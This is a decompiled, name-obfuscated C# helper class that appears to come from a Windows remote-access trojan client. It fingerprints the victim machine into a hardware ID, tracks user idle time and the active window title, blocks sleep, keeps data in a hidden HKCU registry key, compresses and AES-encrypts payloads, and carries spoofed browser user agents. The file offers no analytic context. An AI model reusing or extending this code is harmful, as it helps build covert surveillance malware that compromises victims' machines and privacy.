using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;

// Token: 0x02000011 RID: 17
[StandardModule]
internal sealed class Class6
{
	// Token: 0x0600005D RID: 93
	[DllImport("SHCore.dll", SetLastError = true)]
	public static extern int SetProcessDpiAwareness(int int_2);

	// Token: 0x0600005E RID: 94 RVA: 0x0000242D File Offset: 0x0000062D
	public static bool smethod_0(string string_4)
	{
		return Uri.CheckHostName(string_4) != UriHostNameType.Unknown;
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00006FE8 File Offset: 0x000051E8
	public static string smethod_1(int int_2)
	{
		StringBuilder stringBuilder = new StringBuilder(int_2);
		int num = 0;
		checked
		{
			int num2 = int_2 - 1;
			for (int i = num; i <= num2; i++)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyz"[Class6.random_0.Next("abcdefghijklmnopqrstuvwxyz".Length)]);
			}
			return stringBuilder.ToString();
		}
	}

	// Token: 0x06000060 RID: 96
	[DllImport("user32.dll")]
	public static extern bool GetLastInputInfo(ref Class6.Struct1 struct1_1);

	// Token: 0x06000061 RID: 97 RVA: 0x0000703C File Offset: 0x0000523C
	public static int smethod_2()
	{
		Class6.int_0 = 0;
		Class6.struct1_0.int_0 = Marshal.SizeOf<Class6.Struct1>(Class6.struct1_0);
		Class6.struct1_0.int_1 = 0;
		checked
		{
			if (Class6.GetLastInputInfo(ref Class6.struct1_0))
			{
				Class6.int_0 = Environment.TickCount - Class6.struct1_0.int_1;
			}
			int num;
			if (Class6.int_0 > 0)
			{
				num = (int)Math.Round((double)Class6.int_0 / 1000.0);
			}
			else
			{
				num = 0;
			}
			return num;
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x000070B4 File Offset: 0x000052B4
	public static object smethod_3()
	{
		for (;;)
		{
			Thread.Sleep(1000);
			int num = Class6.smethod_2();
			if (Class6.int_1 <= num)
			{
				Class6.string_2 = Conversions.ToString(Class6.smethod_2());
			}
			else
			{
				Class6.timeSpan_0 = Class6.timeSpan_0.Add(TimeSpan.FromSeconds((double)Class6.int_1));
			}
			Class6.int_1 = num;
		}
	}

	// Token: 0x06000063 RID: 99
	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	// Token: 0x06000064 RID: 100
	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_2);

	// Token: 0x06000065 RID: 101
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern Class6.Enum0 SetThreadExecutionState(Class6.Enum0 enum0_0);

	// Token: 0x06000066 RID: 102 RVA: 0x00007110 File Offset: 0x00005310
	public static void smethod_4()
	{
		try
		{
			Class6.SetThreadExecutionState((Class6.Enum0)2147483651U);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00007148 File Offset: 0x00005348
	public static string smethod_5()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = Class6.GetForegroundWindow();
			if (Class6.GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch (Exception ex)
		{
		}
		return "";
	}

	// Token: 0x06000068 RID: 104 RVA: 0x000071A4 File Offset: 0x000053A4
	public static byte[] smethod_6(string string_4)
	{
		return Encoding.UTF8.GetBytes(string_4);
	}

	// Token: 0x06000069 RID: 105 RVA: 0x000071C0 File Offset: 0x000053C0
	public static string smethod_7(byte[] byte_0)
	{
		return Encoding.UTF8.GetString(byte_0);
	}

	// Token: 0x0600006A RID: 106 RVA: 0x000071DC File Offset: 0x000053DC
	public static string smethod_8()
	{
		string text;
		try
		{
			text = Class6.smethod_9(string.Concat(new object[]
			{
				Environment.ProcessorCount,
				Environment.UserName,
				Environment.MachineName,
				Environment.OSVersion,
				new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
			}));
		}
		catch (Exception ex)
		{
			text = "Err HWID";
		}
		return text;
	}

	// Token: 0x0600006B RID: 107 RVA: 0x00007264 File Offset: 0x00005464
	public static string smethod_9(string string_4)
	{
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = Encoding.ASCII.GetBytes(string_4);
		array = md5CryptoServiceProvider.ComputeHash(array);
		StringBuilder stringBuilder = new StringBuilder();
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}

	// Token: 0x0600006C RID: 108 RVA: 0x000072D8 File Offset: 0x000054D8
	public static bool smethod_10(string string_4, byte[] byte_0)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Class6.string_0, RegistryKeyPermissionCheck.ReadWriteSubTree))
			{
				registryKey.SetValue(string_4, byte_0, RegistryValueKind.Binary);
				return true;
			}
		}
		catch (Exception ex)
		{
		}
		return false;
	}

	// Token: 0x0600006D RID: 109 RVA: 0x0000733C File Offset: 0x0000553C
	public static byte[] smethod_11(string string_4)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Class6.string_0))
			{
				return (byte[])RuntimeHelpers.GetObjectValue(registryKey.GetValue(string_4));
			}
		}
		catch (Exception ex)
		{
		}
		return null;
	}

	// Token: 0x0600006E RID: 110 RVA: 0x000073A8 File Offset: 0x000055A8
	public static byte[] smethod_12(byte[] byte_0)
	{
		byte[] array11;
		using (object obj = new MemoryStream(byte_0))
		{
			byte[] array = new byte[4];
			object obj2 = obj;
			Type type = null;
			string text = "Read";
			object[] array2 = new object[] { array, 0, 4 };
			object[] array3 = array2;
			string[] array4 = null;
			Type[] array5 = null;
			bool[] array6 = new bool[] { true, false, false };
			NewLateBinding.LateCall(obj2, type, text, array3, array4, array5, array6, true);
			if (array6[0])
			{
				array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
			}
			object obj3 = BitConverter.ToInt32(array, 0);
			using (object obj4 = new GZipStream((Stream)obj, CompressionMode.Decompress))
			{
				object obj5 = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(obj3, 1)) + 1)];
				object obj6 = obj4;
				Type type2 = null;
				string text2 = "Read";
				object[] array7 = new object[]
				{
					RuntimeHelpers.GetObjectValue(obj5),
					0,
					RuntimeHelpers.GetObjectValue(obj3)
				};
				object[] array8 = array7;
				string[] array9 = null;
				Type[] array10 = null;
				array6 = new bool[] { true, false, true };
				NewLateBinding.LateCall(obj6, type2, text2, array8, array9, array10, array6, true);
				if (array6[0])
				{
					obj5 = RuntimeHelpers.GetObjectValue(array7[0]);
				}
				if (array6[2])
				{
					obj3 = RuntimeHelpers.GetObjectValue(array7[2]);
				}
				array11 = (byte[])obj5;
			}
		}
		return array11;
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00007538 File Offset: 0x00005738
	public static byte[] smethod_13(byte[] byte_0)
	{
		byte[] array10;
		using (object obj = new MemoryStream())
		{
			object obj2 = BitConverter.GetBytes(byte_0.Length);
			object obj3 = obj;
			Type type = null;
			string text = "Write";
			object[] array = new object[]
			{
				RuntimeHelpers.GetObjectValue(obj2),
				0,
				4
			};
			object[] array2 = array;
			string[] array3 = null;
			Type[] array4 = null;
			bool[] array5 = new bool[] { true, false, false };
			NewLateBinding.LateCall(obj3, type, text, array2, array3, array4, array5, true);
			if (array5[0])
			{
				obj2 = RuntimeHelpers.GetObjectValue(array[0]);
			}
			using (object obj4 = new GZipStream((Stream)obj, CompressionMode.Compress))
			{
				object obj5 = obj4;
				Type type2 = null;
				string text2 = "Write";
				object[] array6 = new object[] { byte_0, 0, byte_0.Length };
				object[] array7 = array6;
				string[] array8 = null;
				Type[] array9 = null;
				array5 = new bool[] { true, false, false };
				NewLateBinding.LateCall(obj5, type2, text2, array7, array8, array9, array5, true);
				if (array5[0])
				{
					byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj4, null, "Flush", new object[0], null, null, null, true);
			}
			array10 = (byte[])NewLateBinding.LateGet(obj, null, "ToArray", new object[0], null, null, null);
		}
		return array10;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x000076C0 File Offset: 0x000058C0
	public static byte[] smethod_14(byte[] byte_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array;
		try
		{
			rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Class6.smethod_6(GClass0.string_3));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			array = cryptoTransform.TransformFinalBlock(byte_0, 0, byte_0.Length);
		}
		catch (Exception ex)
		{
		}
		return array;
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00007730 File Offset: 0x00005930
	public static byte[] smethod_15(byte[] byte_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array;
		try
		{
			rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Class6.smethod_6(GClass0.string_3));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			array = cryptoTransform.TransformFinalBlock(byte_0, 0, byte_0.Length);
		}
		catch (Exception ex)
		{
		}
		return array;
	}

	// Token: 0x06000072 RID: 114 RVA: 0x0000243B File Offset: 0x0000063B
	public static bool smethod_16()
	{
		return true;
	}

	// Token: 0x06000073 RID: 115 RVA: 0x0000243E File Offset: 0x0000063E
	public static void smethod_17()
	{
		if (Class6.mutex_0 != null)
		{
			Class6.mutex_0.Close();
			Class6.mutex_0 = null;
		}
	}

	// Token: 0x0400002B RID: 43
	public static bool bool_0 = false;

	// Token: 0x0400002C RID: 44
	public static Random random_0 = new Random();

	// Token: 0x0400002D RID: 45
	public static readonly string string_0 = "Software\\" + Class6.smethod_8();

	// Token: 0x0400002E RID: 46
	public static string string_1 = Process.GetCurrentProcess().MainModule.FileName;

	// Token: 0x0400002F RID: 47
	private static int int_0;

	// Token: 0x04000030 RID: 48
	private static Class6.Struct1 struct1_0 = default(Class6.Struct1);

	// Token: 0x04000031 RID: 49
	public static TimeSpan timeSpan_0 = new TimeSpan(0L);

	// Token: 0x04000032 RID: 50
	public static int int_1;

	// Token: 0x04000033 RID: 51
	public static string string_2;

	// Token: 0x04000034 RID: 52
	public static string[] string_3 = new string[] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };

	// Token: 0x04000035 RID: 53
	public static Mutex mutex_0;

	// Token: 0x02000012 RID: 18
	public struct Struct1
	{
		// Token: 0x04000036 RID: 54
		[MarshalAs(UnmanagedType.U4)]
		public int int_0;

		// Token: 0x04000037 RID: 55
		[MarshalAs(UnmanagedType.U4)]
		public int int_1;
	}

	// Token: 0x02000013 RID: 19
	public enum Enum0 : uint
	{

	}
}
